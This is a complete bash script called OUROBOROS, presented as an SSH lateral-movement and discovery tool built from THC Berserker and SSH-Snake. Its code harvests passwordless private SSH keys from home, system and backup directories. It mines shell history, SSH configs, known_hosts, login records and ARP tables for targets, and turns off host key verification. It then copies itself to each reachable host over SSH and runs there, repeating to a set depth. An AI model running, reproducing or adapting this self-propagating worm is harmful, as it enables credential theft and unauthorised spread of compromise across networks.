#!/usr/bin/env bash
# shellcheck disable=SC2034,SC2155,SC2086,SC2206,SC2016
# ╔═══════════════════════════════════════════════════════════════════════════╗
# ║  OUROBOROS — SSH Lateral Movement & Discovery                            ║
# ║  Hybrid: THC Berserker (UI/Protocol) × SSH-Snake (Discovery)             ║
# ╚═══════════════════════════════════════════════════════════════════════════╝

###############################################################################
# CONFIGURATION (env-overridable)
###############################################################################
OB_DEPTH="${OB_DEPTH:-8}"
OB_THIS_DEPTH="${OB_THIS_DEPTH:-0}"
OB_TIMEOUT="${OB_TIMEOUT:-3}"
OB_RETRY="${OB_RETRY:-3}"
OB_USE_SUDO="${OB_USE_SUDO:-1}"
OB_USE_ARP="${OB_USE_ARP:-1}"
OB_USE_LAST="${OB_USE_LAST:-1}"

###############################################################################
# ANSI COLORS
###############################################################################
CY="\033[1;33m"; CG="\033[1;32m"; CR="\033[1;31m"; CC="\033[1;36m"
CM="\033[1;35m"; CW="\033[1;37m"; CF="\033[2m";    CN="\033[0m"
CDY="\033[0;33m"; CDG="\033[0;32m"; CDR="\033[0;31m"
CDC="\033[0;36m"; CDM="\033[0;35m"; CL="\033[0K"
[[ -z "$COLUMNS" ]] && { command -v tput >/dev/null && COLUMNS="$(tput cols)" || COLUMNS=80; }

###############################################################################
# GLOBALS
###############################################################################
export LC_ALL="C"
export PATH="$PATH:/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin"
if [[ "${BASH_VERSINFO:-0}" -ge 4 ]]; then
    declare -A ob_priv_keys ob_key_files ob_priv_keys_files
    declare -A ob_home_folders ob_ssh_files
    declare -A ob_ssh_users ob_ssh_hosts ob_ssh_dests
    declare -A ob_ignored_hosts ob_ignored_keys
    declare -A ob_fcache ob_nfcache ob_dcache ob_ndcache
fi
ob_ignored_hosts["openssh.com"]=1
ob_ignored_hosts["255.255.255.255"]=1
s=""  # sudo prefix

SSH_OPTS=(-oControlPath=none -oIdentitiesOnly=yes -oServerAliveInterval=300 \
  -oTCPKeepAlive=no -oConnectTimeout="$OB_TIMEOUT" -oStrictHostKeyChecking=no \
  -oGlobalKnownHostsFile=/dev/null -oUserKnownHostsFile=/dev/null -oBatchMode=yes)

allowed_host_re='[a-zA-Z0-9_.-]'
allowed_user_re='[a-z_][a-z0-9_-]{0,31}'

###############################################################################
# SELF-PROPAGATION SETUP
###############################################################################
if [[ -z "$OB_B64" ]]; then
    if [[ -f "$0" && "$0" != "bash" ]]; then
        OB_B64="$(base64 < "$0" | tr -d '\n')"
    else
        echo -e "${CR}ERROR:${CN} Cannot read self. Use: bash ouroboros.sh" >&2
        exit 1
    fi
    _OB_IS_MASTER=1
    OB_THIS_DEPTH=0
fi

[[ -z "$UID" ]] && UID="$(id -u 2>/dev/null)"
set -o pipefail

###############################################################################
# LOOP DETECTION (Berserker-style MD5 IDs)
###############################################################################
set_machine_id() {
    local id_raw
    if command -v hostnamectl >/dev/null 2>&1; then
        id_raw="$(hostnamectl 2>/dev/null | md5sum)"
    else
        id_raw="$( (ifconfig 2>/dev/null || ip link show 2>/dev/null) | \
            grep -E '(ether|HWaddr)'; hostname 2>/dev/null ) | md5sum)"
    fi
    local id_root="${id_raw:0:8}"
    if [[ "${UID}" -eq 0 ]]; then
        _OB_ID="$id_root"
    else
        _OB_ID="$(echo "${id_root}-${UID}" | md5sum)"
        _OB_ID="${_OB_ID:0:8}"
    fi
}

###############################################################################
# MESSAGING PROTOCOL (Berserker structured stdout)
###############################################################################
MSG_INFO()  { echo "|I|${OB_THIS_DEPTH}|${_OB_ID}|$*"; }
MSG_TRY()   { echo "|T|${OB_THIS_DEPTH}|${_OB_ID}|$1|$2"; }
MSG_OK()    { echo "|O|${OB_THIS_DEPTH}|${_OB_ID}|$*"; }
MSG_DONE()  { echo "|C|${OB_THIS_DEPTH}|${_OB_ID}|$*"; }
MSG_FAIL()  { echo "|F|${OB_THIS_DEPTH}|${_OB_ID}|"; }
MSG_ERROR() { echo "|E|${OB_THIS_DEPTH}|${_OB_ID}|$*"; }
MSG_DEPTH() { echo "|D|${OB_THIS_DEPTH}|${_OB_ID}|"; }
MSG_LINK()  { echo "|L|${OB_THIS_DEPTH}|${_OB_ID}|${_OB_ID_CALLER}|$USER|$(hostname 2>/dev/null)"; }

###############################################################################
# MASTER TREE-VIEW UI (Berserker ANSI output)
###############################################################################
DX="│   │   │   │   │   │   │   │   │   │   "
_m_lf="" ; _m_lft="" ; _m_esc=0 ; _m_last=""

M_INFO() {
    [[ -n "$_m_lf" ]] && { echo ""; _m_lf=""; }
    echo -e "${DX:0:$(($1*4))}│${CF}${2}${CN}${CL}"
}
M_ERROR() {
    local dx="${DX:0:$(($1*4))}"
    if [[ -n "$_m_lf" ]] || [[ -n "$_m_lft" ]]; then
        _m_lf=""; local l=$((COLUMNS-6-${#dx}-${#2}+_m_esc))
        printf "\r${dx}├── %-${l}.${l}b ${CDR}%s${CN}\n" "ssh ${_m_last}" "$2"; return
    fi
    echo -e "${dx}│${CDR}ERROR: ${2}${CN}${CL}"
}
M_TRY() {
    [[ -n "$_m_lf" ]] && { echo ""; _m_lf=""; }
    local dx="${DX:0:$(($1*4))}"
    local l=$((COLUMNS-23-${#dx}))
    _m_esc=0; _m_last="$2"
    local len=${#_m_last}
    _m_last="${2/root@/${CG}root${CN}@}"
    [[ "$len" -ne "${#_m_last}" ]] && _m_esc=11
    l=$((l+_m_esc))
    printf "${dx}├── %-${l}.${l}b %17s" "ssh ${_m_last}" "${3}"
    _m_lft=1
}
M_OK() {
    local dx="${DX:0:$(($1*4))}"
    local l=$((COLUMNS-8-${#dx}+_m_esc))
    [[ -n "$_m_lf" ]] && echo ""; _m_lf=1
    printf "\r${dx}├── %-${l}.${l}b ${CDG}OK${CN}" "ssh $_m_last"
}
M_DONE() {
    local kstr=" $2" dx="${DX:0:$(($1*4))}"
    if [[ -n "$_m_lf" ]]; then
        _m_lf=""; local l=$((COLUMNS-8-${#dx}+_m_esc))
        printf "\r${dx}├── %-${l}.${l}b ${CDG}OK${CN}\n" "ssh -i${kstr} ${_m_last}"; return
    fi
    printf "${dx}│   └── [${CDY}COMPLETE${CDM}${kstr}${CN}]${CL}\n"
}
M_FAILED() { echo -en "\r"; }

###############################################################################
# MASTER/SLAVE DISPATCHER (Berserker protocol router)
###############################################################################
if [[ -n "$_OB_IS_MASTER" ]]; then
    msg_dispatch() {
        IFS='|'
        while read -ra ar; do
            [[ -n "${ar[0]}" ]] && continue
            case "${ar[1]}" in
                I) M_INFO  "${ar[2]}" "${ar[4]}" ;;
                L) OB_LOOPDB+="${ar[3]}|" ;;
                O) M_OK    "${ar[2]}" ;;
                T) M_TRY   "${ar[2]}" "${ar[4]}" "${ar[5]}" ;;
                C) M_DONE  "${ar[2]}" "${ar[4]}" ;;
                D) ;;
                F) M_FAILED ;;
                E) M_ERROR "${ar[2]}" "${ar[4]}" ;;
            esac
        done
    }
else
    msg_dispatch() {
        while read -r l; do
            [[ "${l:1:1}" == "L" ]] && { IFS='|' read -ra _a <<< "$l"; OB_LOOPDB+="${_a[3]}|"; }
            echo "$l"
        done
    }
fi

###############################################################################
# SETUP HELPERS
###############################################################################
check_sudo() {
    [[ "$OB_USE_SUDO" -eq 1 ]] && sudo -n true >/dev/null 2>&1 && s="sudo"
}

check_ssh_compat() {
    local xo
    for xo in -oHostkeyAlgorithms=+ssh-rsa -oKexAlgorithms=+diffie-hellman-group1-sha1; do
        [[ "$(ssh "$xo" 2>&1)" =~ Bad\ protocol|Bad\ key|Bad\ SSH2|diffie-hellman|ssh-rsa ]] || SSH_OPTS+=("$xo")
    done
    xo="-oPubkeyAcceptedKeyTypes=+ssh-rsa"
    [[ "$(ssh "$xo" 2>&1)" =~ Bad\ configuration|pubkeyacceptedkeytypes ]] || SSH_OPTS+=("$xo")
}

###############################################################################
# UTILITY: file/dir/user/host/dest validators (Snake-style caching)
###############################################################################
is_file() {
    [[ -z "$1" ]] && return 1
    [[ -v 'ob_fcache["$1"]' ]] && return 0
    [[ -v 'ob_nfcache["$1"]' ]] && return 1
    ${s} test -s "$1" 2>/dev/null && ${s} test -r "$1" 2>/dev/null && ${s} test -f "$1" 2>/dev/null && { ob_fcache["$1"]=1; return 0; }
    ob_nfcache["$1"]=1; return 1
}
is_dir() {
    [[ -z "$1" ]] && return 1
    [[ -v 'ob_dcache["$1"]' ]] && return 0
    [[ -v 'ob_ndcache["$1"]' ]] && return 1
    ${s} test -d "$1" 2>/dev/null && ${s} test -r "$1" 2>/dev/null && { ob_dcache["$1"]=1; return 0; }
    ob_ndcache["$1"]=1; return 1
}
is_ssh_user() {
    [[ -z "$1" ]] && return 1
    [[ "$1" =~ ^${allowed_user_re}$ ]] || return 1
    return 0
}
is_ssh_host() {
    local h="$1"
    [[ -z "$h" ]] && return 1
    [[ -v 'ob_ignored_hosts["$h"]' ]] && return 1
    [[ "$h" =~ ^${allowed_host_re}+$ ]] || return 1
    [[ "${h:0:1}" == "-" || "${h: -1}" == "-" || "${h:0:1}" == "." || "${h: -1}" == "." ]] && return 1
    [[ "$h" =~ ^[0-9.]+$ ]] && { [[ "$h" =~ ^[0-9]+(\.[0-9]+){3}$ ]] || return 1; }
    return 0
}
is_ssh_dest() {
    local d="${1,,}"; [[ -z "$d" ]] && return 1
    is_ssh_host "${d#*@}" && is_ssh_user "${d%%@*}"
}
add_ssh_user() { is_ssh_user "$1" && ob_ssh_users["$1"]=1 && return 0; return 1; }
add_ssh_host() { is_ssh_host "$1" && ob_ssh_hosts["$1"]=1 && return 0; return 1; }
add_ssh_dest() {
    local d="${1,,}" u="${1%%@*}" h="${1#*@}"
    d="${d,,}"
    is_ssh_dest "$d" && ob_ssh_dests["$d"]=1 && ob_ssh_hosts["${d#*@}"]=1 && ob_ssh_users["${d%%@*}"]=1 && return 0
    return 1
}

###############################################################################
# KEY DISCOVERY (Snake-style comprehensive scanning)
###############################################################################
check_file_for_privkey() {
    local hdr; is_file "$1" || return 1
    read -r -n 50 hdr < <(${s} cat -- "$1" 2>/dev/null)
    [[ "$hdr" == *"PRIVATE KEY"* || "$hdr" == *"SSH PRIVATE KEY FILE"* ]]
}

populate_key() {
    local kf="$1" pub ret
    pub="$(${s} ssh-keygen -P NOT_VALID4SURE -yf "$kf" 2>&1)"
    ret=$?
    [[ "$pub" == *"invalid format"* || "$pub" == *"No such file"* ]] && return 1
    [[ $ret -eq 0 ]] && { ob_priv_keys["$pub"]="$kf"; return 0; }
    return 1
}

check_and_add_key() {
    local f="$1"; [[ -z "$f" ]] && return 1
    [[ -v 'ob_priv_keys_files["$f"]' ]] && return 0
    [[ -v 'ob_key_files["$f"]' ]] && return 1
    local r; r="$(${s} readlink -f -- "$f" 2>/dev/null)"
    [[ -z "$r" ]] && { ob_key_files["$f"]=1; return 1; }
    [[ -v 'ob_priv_keys_files["$r"]' ]] && { ob_priv_keys_files["$f"]=1; return 0; }
    [[ -v 'ob_key_files["$r"]' ]] && { ob_key_files["$f"]=1; return 1; }
    ob_key_files["$f"]=1; ob_key_files["$r"]=1
    check_file_for_privkey "$r" && populate_key "$r" && { ob_priv_keys_files["$r"]=1; ob_priv_keys_files["$f"]=1; return 0; }
    return 1
}

###############################################################################
# DISCOVERY: Home Folders & SSH Files (Snake, enhanced)
###############################################################################
find_home_folders() {
    local hf
    # Standard home directories
    while IFS= read -r hf; do
        [[ -v 'ob_home_folders["$hf"]' ]] && continue
        hf="$(readlink -f -- "$hf" 2>/dev/null)"
        is_dir "$hf" && ob_home_folders["$hf"]=1
    done < <(${s} find -L /home /Users -mindepth 1 -maxdepth 1 -type d 2>/dev/null)
    # From passwd database (covers service accounts, custom home dirs)
    while IFS=: read -r _ _ _ _ _ hf _; do
        [[ -v 'ob_home_folders["$hf"]' ]] && continue
        hf="$(readlink -f -- "$hf" 2>/dev/null)"
        is_dir "$hf" && ob_home_folders["$hf"]=1
    done < <(getent passwd 2>/dev/null)
    # Always include current user and root
    [[ -d "$HOME" ]] && ob_home_folders["$HOME"]=1
    is_dir "/root" && ob_home_folders["/root"]=1
    # Service/app accounts that commonly have SSH keys
    local extra_dir
    for extra_dir in /var/www /var/lib/jenkins /var/lib/gitlab-runner \
        /var/lib/mysql /var/lib/postgresql /var/lib/nagios /var/lib/zabbix \
        /var/lib/rundeck /var/lib/ansible /var/lib/docker /var/lib/libvirt \
        /opt /srv; do
        is_dir "$extra_dir" && ob_home_folders["$extra_dir"]=1
    done
}

init_ssh_files() {
    local hf sf
    # Scan .ssh dirs in all discovered home folders
    for hf in "${!ob_home_folders[@]}"; do
        is_dir "$hf/.ssh" || continue
        while IFS= read -r sf; do
            is_file "$sf" && ob_ssh_files["$sf"]=1
        done < <(${s} find -L "$hf/.ssh" -type f 2>/dev/null)
    done
    # Also scan /etc/ssh for host keys
    if is_dir "/etc/ssh"; then
        while IFS= read -r sf; do
            is_file "$sf" && ob_ssh_files["$sf"]=1
        done < <(${s} find -L /etc/ssh -type f -name '*key*' 2>/dev/null)
    fi
}

find_ssh_keys() {
    local sf; for sf in "${!ob_ssh_files[@]}"; do check_and_add_key "$sf"; done
}

# Broad filesystem scan for private keys in common locations
find_ssh_keys_broad() {
    local sf
    while IFS= read -r sf; do
        check_and_add_key "$sf"
    done < <(${s} find -L /home /root /etc/ssh /var /opt /srv /tmp /backup /backups \
        /mnt /media \
        -maxdepth 4 -type f -size +200c -size -14000c \
        -exec grep -l -m 1 -E '^----[-| ]BEGIN .{0,15}PRIVATE KEY' {} + \
        2>/dev/null)
}

###############################################################################
# DISCOVERY: Bash/Zsh History (Snake + Berserker)
###############################################################################
find_from_history() {
    local hf
    for hf in "${!ob_home_folders[@]}"; do
        local huser; huser="$(basename -- "$hf" 2>/dev/null)"
        local hfile line
        for hfile in "$hf/.bash_history" "$hf/.zsh_history"; do
            is_file "$hfile" || continue
            while IFS= read -r line; do
                [[ "$line" == ": "* ]] && line="${line#*;}"
                local dest
                if dest="$(echo "$line" | grep -m 1 -oE "${allowed_user_re}@[^ :]+" 2>/dev/null)"; then
                    add_ssh_dest "$dest"
                fi
                if [[ "$line" == *" -i "* ]]; then
                    local kf; kf="$(echo "$line" | grep -oP '(?<=-i\s)\S+' 2>/dev/null)"
                    [[ -n "$kf" ]] && { check_and_add_key "$kf"; check_and_add_key "$hf/${kf#\~/}"; }
                fi
                if [[ "$line" == "ssh "* && "$line" != *"@"* ]]; then
                    local -a tokens; read -ra tokens <<< "$line"
                    local i; for ((i=1; i<${#tokens[@]}; i++)); do
                        local t="${tokens[$i]}"
                        [[ "$t" == "-"* ]] && { [[ ! "$t" =~ ^-[46AaCfGgKkMNnqsTtVvXxYy]+$ ]] && ((i++)); continue; }
                        add_ssh_host "$t"
                        [[ -n "$huser" ]] && add_ssh_dest "$huser@$t"
                        break
                    done
                fi
            done < <(${s} grep -E '^(ssh |scp |: [0-9]+:[0-9]+;ssh )' -- "$hfile" 2>/dev/null | sort -u)
        done
    done
}

###############################################################################
# DISCOVERY: SSH Config (Snake)
###############################################################################
find_from_ssh_config() {
    local hf
    for hf in "${!ob_home_folders[@]}"; do
        is_dir "$hf/.ssh" || continue
        local huser sf; huser="$(basename -- "$hf" 2>/dev/null)"
        while IFS= read -r sf; do
            is_file "$sf" || continue
            local cline
            while IFS= read -r cline; do
                local key val
                key="$(echo "$cline" | awk '{print tolower($1)}')"
                val="$(echo "$cline" | awk '{print $NF}')"
                [[ -z "$val" || -z "$key" ]] && continue
                case "$key" in
                    host|hostname) add_ssh_host "$val"; [[ -n "$huser" ]] && add_ssh_dest "$huser@$val" ;;
                    user) add_ssh_user "$val" ;;
                    identityfile) check_and_add_key "$val"; check_and_add_key "$hf/${val#\~/}" ;;
                esac
            done < <(${s} grep -iE '^[[:space:]]*(Host|HostName|User|IdentityFile)' -- "$sf" 2>/dev/null | sort -u)
        done < <(${s} find -L "$hf/.ssh" -type f \( -name 'config' -o -name 'config.*' \) 2>/dev/null)
    done
}

###############################################################################
# DISCOVERY: Known Hosts (Snake)
###############################################################################
find_from_known_hosts() {
    local skg
    [[ "$(ssh-keygen -E 2>&1)" == *"unknown option"* ]] && skg=(ssh-keygen -l -f) || skg=(ssh-keygen -E md5 -l -f)
    local sf
    for sf in "${!ob_ssh_files[@]}"; do
        [[ "$sf" == *"known_hosts"* ]] || continue
        local huser line
        huser="$(for h in "${!ob_home_folders[@]}"; do [[ "$sf" == "$h"* ]] && basename -- "$h" && break; done)"
        while IFS= read -r line; do
            [[ -z "$line" || "$line" == *"|1|"* ]] && continue
            local host; host="$(echo "$line" | awk '{print $2}')"
            [[ -z "$host" ]] && continue
            # Handle [host]:port format
            [[ "$host" == "["* ]] && host="${host#[}" && host="${host%%]*}"
            add_ssh_host "$host"
            [[ -n "$huser" ]] && add_ssh_dest "$huser@$host"
        done < <(${s} "${skg[@]}" "$sf" 2>/dev/null)
    done
}

###############################################################################
# DISCOVERY: Authorized Keys (Snake)
###############################################################################
find_from_authorized_keys() {
    local sf
    for sf in "${!ob_ssh_files[@]}"; do
        [[ "$sf" == *"authorized_keys"* ]] || continue
        local huser addr host
        huser="$(for h in "${!ob_home_folders[@]}"; do [[ "$sf" == "$h"* ]] && basename -- "$h" && break; done)"
        while IFS= read -r addr; do
            [[ -z "$addr" ]] && continue
            while IFS= read -r host; do
                add_ssh_host "$host"
                [[ -n "$huser" ]] && add_ssh_dest "$huser@$host"
            done < <(echo "$addr" | tr ',' '\n' | sort -u)
        done < <(${s} grep -oP 'from="\K[^"]+' -- "$sf" 2>/dev/null)
    done
}

###############################################################################
# DISCOVERY: Last Logins (Snake)
###############################################################################
find_from_last() {
    [[ "$OB_USE_LAST" -eq 1 ]] || return
    last -aiw >/dev/null 2>&1 || return
    local dest
    while IFS= read -r dest; do
        add_ssh_dest "$dest"
    done < <(last -aiw 2>/dev/null | grep -v reboot | \
        awk '/[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/ {print $1"@"$NF}' | sort -u)
}

###############################################################################
# DISCOVERY: ARP Neighbors (Snake)
###############################################################################
find_arp_neighbours() {
    [[ "$OB_USE_ARP" -eq 1 ]] || return
    local host
    while IFS= read -r host; do add_ssh_host "$host"
    done < <(ip neigh 2>/dev/null | awk '$1 !~ /(\.1$|:)/ {print $1}' | sort -u)
    while IFS= read -r host; do add_ssh_host "$host"
    done < <(arp -a 2>/dev/null | awk -F'[()]' '{print $2}' | awk '$1 !~ /(\.1$|:)/{print $1}' | sort -u)
}

###############################################################################
# DISCOVERY: Combinate interesting user+host pairs
###############################################################################
combinate_users_hosts() {
    add_ssh_user "$USER"; add_ssh_user "root"
    local h
    for h in "${!ob_ssh_hosts[@]}"; do
        add_ssh_dest "$USER@$h"
        add_ssh_dest "root@$h"
    done
}

###############################################################################
# FIND ALL
###############################################################################
find_all() {
    find_home_folders
    init_ssh_files
    find_ssh_keys
    find_ssh_keys_broad   # broad grep scan for keys in /var, /opt, /tmp, etc.
    find_from_history
    find_from_ssh_config
    (( ${#ob_priv_keys[@]} )) || return 1
    find_from_authorized_keys
    find_from_last
    find_from_known_hosts
    find_arp_neighbours
    combinate_users_hosts
    return 0
}

###############################################################################
# BANNER
###############################################################################
print_banner() {
    echo -e "${CM}"
    cat << 'EOF'
     ░█▀█░█░█░█▀▄░█▀█░█▀▄░█▀█░█▀▄░█▀█░█▀▀
     ░█░█░█░█░█▀▄░█░█░█▀▄░█░█░█▀▄░█░█░▀▀█
     ░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀▀▀
EOF
    echo -e "${CN}"
    echo -e "  ${CF}SSH Lateral Movement & Discovery${CN}"
    echo -e "  ${CF}Berserker × Snake Hybrid // Depth=$OB_DEPTH Timeout=${OB_TIMEOUT}s${CN}"
    echo ""
}

###############################################################################
# SSH EXECUTION (Berserker fd-redirect + Snake retry logic)
###############################################################################
attempt_connections() {
    local n=0 n_total=${#ob_ssh_dests[@]}

    for dest in "${!ob_ssh_dests[@]}"; do
        local ssh_host="${dest#*@}"
        # Skip hosts that became ignored during execution
        [[ -v 'ob_ignored_hosts["$ssh_host"]' ]] && continue

        for pubkey in "${!ob_priv_keys[@]}"; do
            local key_file="${ob_priv_keys[$pubkey]}"
            [[ -v 'ob_ignored_keys["$key_file"]' ]] && continue

            n=$((n+1))
            MSG_TRY "-i $(basename "$key_file") $dest" "${n}/${n_total}"

            local err ret=0
            # Berserker fd trick: stdout→fd3→pipe, stderr→captured in $err
            { err="$( { command ssh "${SSH_OPTS[@]}" -i "$key_file" -- "$dest" \
                "export OB_B64='$OB_B64' OB_LOOPDB='${OB_LOOPDB}' \
                 OB_THIS_DEPTH=$((OB_THIS_DEPTH+1)) OB_DEPTH=${OB_DEPTH} \
                 OB_TIMEOUT=${OB_TIMEOUT} OB_USE_SUDO=${OB_USE_SUDO} \
                 OB_USE_ARP=${OB_USE_ARP} OB_USE_LAST=${OB_USE_LAST} \
                 _OB_ID_CALLER='${_OB_ID}'; \
                 printf '%s' \"\$OB_B64\" | base64 -d | bash --noprofile --norc" \
                </dev/null; } 2>&1 1>&3 3>&- )"; } 3>&1 || ret=$?

            if [[ $ret -eq 0 ]]; then
                MSG_DONE "$(basename "$key_file")"
                break  # Key worked, move to next dest
            else
                # Classify errors (Berserker-style)
                if [[ "$err" == *"ermission denied"* || "$err" == *"Permission denied"* ]]; then
                    MSG_ERROR "Permission denied"
                elif [[ "$err" == *"Connection refused"* ]]; then
                    MSG_ERROR "Connection refused"; ob_ignored_hosts["$ssh_host"]=1; break
                elif [[ "$err" == *"timed out"* ]]; then
                    MSG_ERROR "Connection timed out"; ob_ignored_hosts["$ssh_host"]=1; break
                elif [[ "$err" == *"not resolve hostname"* ]]; then
                    MSG_ERROR "Could not resolve hostname"; ob_ignored_hosts["$ssh_host"]=1; break
                elif [[ "$err" == *"Host is down"* ]]; then
                    MSG_ERROR "Host is down"; ob_ignored_hosts["$ssh_host"]=1; break
                elif [[ "$err" == *"No route to host"* ]]; then
                    MSG_ERROR "No route to host"; ob_ignored_hosts["$ssh_host"]=1; break
                elif [[ "$err" == *"Too many authentication"* ]]; then
                    MSG_ERROR "Too many auth attempts"; break
                elif [[ "$err" == *"Disconnected"* || "$err" == *"Connection reset"* ]]; then
                    MSG_ERROR "Disconnected"; break
                elif [[ "$err" == *"Identity file"* && "$err" == *"not accessible"* ]]; then
                    ob_ignored_keys["$key_file"]=1
                else
                    local short="${err##*$'\n'}"
                    [[ "${#short}" -gt 50 ]] && short="${short: -50}"
                    MSG_ERROR "${short:-Unknown error}"
                fi
                MSG_FAIL
            fi
        done
    done
}

###############################################################################
# MAIN
###############################################################################
main() {
    # Prereqs
    if [[ "${BASH_VERSINFO:-0}" -lt 4 ]]; then
        echo "ERROR: bash 4+ required (have: ${BASH_VERSION:-unknown})" >&2; exit 1
    fi
    command -v md5sum >/dev/null 2>&1 || { command -v md5 >/dev/null 2>&1 && md5sum() { md5; }; } || { echo "md5sum not found" >&2; exit 1; }
    command -v ssh-keygen >/dev/null 2>&1 || { echo "ssh-keygen not found" >&2; exit 1; }
    command -v ssh >/dev/null 2>&1 || { echo "ssh not found" >&2; exit 1; }

    set_machine_id
    check_sudo
    check_ssh_compat

    # Slave-mode initialization
    if [[ -z "$_OB_IS_MASTER" ]]; then
        [[ "$OB_THIS_DEPTH" -ge "$OB_DEPTH" ]] && { MSG_DEPTH; exit 0; }
        [[ "$OB_LOOPDB" == *"$_OB_ID"* ]] && { MSG_INFO "Loop detected (${_OB_ID})"; exit 0; }
        MSG_LINK
    else
        print_banner
    fi

    OB_LOOPDB+="${_OB_ID}|"

    # Discovery
    if ! find_all; then
        if [[ -n "$_OB_IS_MASTER" ]]; then
            M_INFO 0 "No usable private keys found. Nothing to do."
        else
            MSG_INFO "No keys found"
        fi
        exit 0
    fi

    # Report
    if [[ -n "$_OB_IS_MASTER" ]]; then
        M_INFO 0 "Found ${#ob_priv_keys[@]} key(s) without password."
        M_INFO 0 "Found ${#ob_ssh_dests[@]} destination(s) to try."
        local kn=0
        for k in "${!ob_priv_keys[@]}"; do
            kn=$((kn+1))
            local kp="${ob_priv_keys[$k]}"
            [[ "$kp" == "$HOME"* ]] && kp="~${kp:${#HOME}}"
            M_INFO 0 "[#${kn}] $kp"
        done
    else
        MSG_INFO "Found ${#ob_priv_keys[@]} key(s), ${#ob_ssh_dests[@]} dest(s)"
    fi

    [[ "${#ob_ssh_dests[@]}" -eq 0 ]] && exit 0

    # Execute
    attempt_connections | msg_dispatch

    # Finish
    if [[ -n "$_OB_IS_MASTER" ]]; then
        echo -e "└──[${CDG}DONE${CN}]${CL}"
        echo ""
        echo -e "${CF}──────────────────────────────────────${CN}"
        echo -e "  ${CW}Keys:${CN}  ${CG}${#ob_priv_keys[@]}${CN} discovered"
        echo -e "  ${CW}Dests:${CN} ${CY}${#ob_ssh_dests[@]}${CN} attempted"
        echo -e "${CF}──────────────────────────────────────${CN}"
    fi
}

main
